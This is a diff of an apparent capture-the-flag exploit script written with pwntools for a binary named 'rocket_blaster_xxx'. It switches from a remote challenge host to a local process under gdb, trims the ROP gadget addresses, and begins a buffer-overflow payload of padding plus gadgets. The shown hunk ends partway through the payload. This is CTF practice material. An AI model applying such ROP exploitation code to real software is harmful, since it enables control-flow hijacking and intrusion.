@@ -3,21 +3,17 @@ from pwn import *
 exe = ELF('./rocket_blaster_xxx_patched')
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-linux-x86-64.so.2")
-# p = process(exe.path)
-p = remote('83.136.252.214',35857 )
-# context.terminal = ['foot']
-# gdb.attach(p, gdbscript='''
-#
-#
-#            ''')
+p = process(exe.path)
+# p = remote('83.136.252.214',35857 )
+context.terminal = ['foot']
+gdb.attach(p, gdbscript='''
+
+
+           ''')
 #################exploiting#####################
 pop_rdi = 0x000000000040159f
-pop_rsi = 0x000000000040159d
-pop_rdx = 0x000000000040159b
-printf_plt = 0x4010f0
 ret = 0x0000000000401588
 puts = 0x4010e0
-pop_rbp = 0x000000000040125d
 main_back = 0x00000000004014ff
 payload = b''.ljust(0x28)
 payload += p64(ret)
